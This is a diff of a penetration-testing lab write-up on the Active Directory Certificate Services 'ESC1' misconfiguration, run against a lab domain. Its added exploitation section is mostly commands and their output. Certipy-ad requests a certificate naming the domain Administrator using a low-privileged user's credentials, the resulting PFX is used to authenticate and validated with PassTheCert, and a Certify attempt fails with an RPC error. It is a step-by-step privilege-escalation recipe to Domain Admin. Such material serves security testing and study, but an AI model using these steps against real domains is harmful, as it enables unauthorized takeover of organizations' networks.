@@ -7,7 +7,6 @@ Explanation / Context - Misconfigured Certificate Templates - ESC1
 -----------------------------------------------------------------------------------------------
 - The Enterprise CA grants low-privileged users enrolment rights
 - Manager approval is disabled
-- No authorized signatures are required
 - An overly permissive certificate template security descriptor grants certificate enrolment rights to low-privileged users
 - The certificate template defines EKUs (Extended/Enhanced Key Usage) that enable authentication such as: Client Authentication or Smart Card Logon or PKINIT Client Authentication ...
 
@@ -21,10 +20,17 @@ Explanation / Context - Misconfigured Certificate Templates - ESC1
 Various tools can be used to identify and exploit the ADCS Domain Escalation technique "ESC1"
 -----------------------------------------------------------------------------------------------
 - Certutil (native windows command)
-- Certify (https://github.com/GhostPack/Certify)
+- Certify.exe (https://github.com/GhostPack/Certify)
 - Certipy.py (https://github.com/ly4k/Certipy)
+- PSPKIAudit.psm1 (https://github.com/GhostPack/PSPKIAudit)
+- PassTheCert.exe (https://github.com/AlmondOffSec/PassTheCert)
 - ...
 
+Info
+-----
+- Lab domain name: company.work
+- Lab domain controller (with ADCS) : dc1.company.work
+- Low priv domain user: LowPrivUser
 
 =======================================================================================================================================
 PoC - Step 1 - ADCS enumeration using a low privileged domain user and the native windows command 'Certutil' + the C# tool 'Certify.exe'
@@ -165,7 +171,7 @@ The tool allows to:
 Command to find information about all registered Certificate Authorities
 -------------------------------------------------------------------------
  
-C:\temp>Certifyx64.exe cas /domain:company.work /ldapserver:dc1.company.work /path:CN=Configuration,DC=company,DC=work /showAllPermissions
+C:\temp> Packed_Certify.exe cas /domain:company.work /ldapserver:dc1.company.work /path:CN=Configuration,DC=company,DC=work /showAllPermissions
 
    _____          _   _  __
   / ____|        | | (_)/ _|
@@ -271,7 +277,7 @@ PoC 2 - Step 2 - Find vulnerable/abusable certificate templates (ESC1) with the 
 Command to find vulnerable/abusable certificate templates using default low-privileged groups
 ----------------------------------------------------------------------------------------------
 
-C:\temp>Certifyx64.exe find /vulnerable /domain:company.work /ldapserver:dc1.company.work /path:CN=Configuration,DC=company,DC=work
+C:\temp> Packed_Certify.exe find /vulnerable /domain:company.work /ldapserver:dc1.company.work /path:CN=Configuration,DC=company,DC=work
 
    _____          _   _  __
   / ____|        | | (_)/ _|
@@ -349,7 +355,123 @@ This allows anyone to enroll in this template and specify an arbitrary Subject A
 
 
 =======================================================================================================================================
-PoC - Step 3 - Exploit the "ESC1" vulnerability to escalate your privileges and become Domain Admin using 'Certify.exe'
+PoC - Step 3 - Exploit the "ESC1" vulnerability to escalate your privileges from a Domain User to Domain Admin
 =======================================================================================================================================
 
+---------------------------------------------------------------------------------------------------------------------------------------
+Method 1. Using the tool "Certipy.py" (which is named "certipy-ad" in Kali) and the tool "PassTheCert.exe"
+---------------------------------------------------------------------------------------------------------------------------------------
+
+jeff@kali:~$ sudo apt-get install certipy-ad
+Reading package lists... Done
+Building dependency tree... Done
+Reading state information... Done
+<SNIP>                                                                                       
+Setting up certipy-ad (4.0.0-0kali1) ...
+Processing triggers for kali-menu (2021.2.1) ...
+
+
+jeff@kali:~$ certipy-ad
+
+Certipy v4.3.0 - by Oliver Lyak (ly4k)
+
+usage: certipy-ad [-v] [-h] {account,auth,ca,cert,find,forge,ptt,relay,req,shadow,template} ...
+
+Active Directory Certificate Services enumeration and abuse
+
+positional arguments:
+  {account,auth,ca,cert,find,forge,ptt,relay,req,shadow,template}
+                        Action
+    account             Manage user and machine accounts
+    auth                Authenticate using certificates
+    ca                  Manage CA and certificates
+    cert                Manage certificates and private keys
+    find                Enumerate AD CS
+    forge               Create Golden Certificates
+    ptt                 Inject TGT for SSPI authentication
+    relay               NTLM Relay to AD CS HTTP Endpoints
+    req                 Request certificates
+    shadow              Abuse Shadow Credentials for account takeover
+    template            Manage certificate templates
+
+options:
+  -v, --version         Show Certipy's version number and exit
+  -h, --help            Show this help message and exit
+
+
+=> Command to request a new certificate as a low privileged domain user for the vulnerable template/CA (User_template) with the Domain Admin account 
+   "COMPANY\Administrator" specified as the alternate principal.
+-----------------------------------------------------------------------------------------------------------------------------------------------------
+
+jeff@kali:~$ certipy-ad req -u LowPrivUser@company.work -p 'SuperGenialPwd' -target 192.168.1.167 -ca company-DC1-CA -template User_template -upn administrator@company.work -dc-ip 192.168.1.167
+
+Certipy v4.3.0 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Successfully requested certificate
+[*] Request ID is 3
+[*] Got certificate with UPN 'administrator@company.work'
+[*] Certificate has no object SID
+[*] Saved certificate and private key to 'administrator.pfx'
+
+jeff@kali:~$ ls -al administrator.pfx 
+-rw-r--r-- 1 jeff jeff 3125 May 30 03:29 administrator.pfx
+
+jeff@kali:~$ certipy-ad auth -pfx administrator.pfx -domain company.work -username administrator -dc-ip 192.168.1.167
+Certipy v4.3.0 - by Oliver Lyak (ly4k)
+
+[*] Using principal: administrator@company.work
+[*] Trying to get TGT...
+[-] Got error while trying to request TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
+
+NOTES
+------
+The attack worked and we now have a PFX certificate valid for the Domain Admin account "Company\Administrator".
+However when I tried to use the PFX but I have a problem of synchronization between my kali linux machin and my LAB Domain Controller 'dc1.company.work'.
+So I used the tool "PassTheCert.exe" to validate that the PFX certificate is indeed valid :-)
+   
+PS C:\Users\j-cana\Documents\Tools-Pentest> .\Packed_PassTheCert.exe --cert-path ./administrator.pfx --whoami --target DC=company,DC=work --server 192.168.1.167
+Querying LDAP As : u:COMPANY\Administrator
+
+
+---------------------------------------------------------------------------------------------------------------------------------------
+Method 2. Using the tool certify.exe
+---------------------------------------------------------------------------------------------------------------------------------------
+
+=> Command to request a new certificate for the vulnerable template/CA (User_template) with the Domain Admin account 
+  "COMPANY\Administrator" specified as the alternate principal.
+----------------------------------------------------------------------------------------------------------------------
+
+C:\temp> Packed_Certify.exe request /ca:DC1.company.work\company-DC1-CA /template:User_template /altname:Administrator
+
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v1.1.0
+
+[*] Action: Request a Certificates
+
+[*] Current user context    : COMPANY\LowPrivUser
+[*] No subject name specified, using current context as subject.
+
+[*] Template                : User_template
+[*] Subject                 : CN=LowPrivUser, CN=Users, DC=company, DC=work
+[*] AltName                 : Administrator
+
+[*] Certificate Authority   : DC1.company.work\company-DC1-CA
+[X] Error sending the certificate request: System.Runtime.InteropServices.COMException (0x800706BA): CCertRequest::Submit: The RPC server is unavailable. 0x800706ba (WIN32: 1722 RPC_S_SERVER_UNAVAILABLE)
+   at CERTCLILib.ICertRequest3.Submit(Int32 Flags, String strRequest, String strAttributes, String strConfig)
+   at Certify.Cert.SendCertificateRequest(String CA, String message)
+   at Certify.Cert.RequestCert(String CA, Boolean machineContext, String templateName, String subject, String altName, String sidExtension, Boolean install)
+
+Certify completed in 00:00:00.5455515
+
+Conclusion
+-----------
+=> It did not worked with the tool "Certify.exe" in my lab (I received an RPC error message) which is weird since the attack worked with the tool Certipy.
 
